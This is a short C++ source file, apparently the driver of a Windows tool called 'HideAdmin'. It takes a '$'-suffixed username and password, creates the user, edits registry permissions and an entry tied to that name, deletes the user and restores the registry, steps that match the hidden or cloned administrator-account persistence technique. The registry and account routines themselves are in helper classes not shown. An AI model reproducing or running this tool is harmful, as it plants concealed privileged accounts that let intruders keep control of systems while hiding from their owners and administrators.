// HideAdmin.cpp: 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "ModReg.h"
#include "UserOperate.h"

int main(int argc, char *argv[]){
	ModReg reg;
	UserOperate user;

	if (argc < 3) {
		printf("Usage: HideAdmin username$ userpass");
		return 0;
	}

	user.GetUserPass(argv[1], argv[2]);
	user.UserCreate();
	reg.ModRegAut();
	reg.ModRegCon(argv[1]);
	user.UserDel();
	reg.ModRegRec();

    return 0;
}

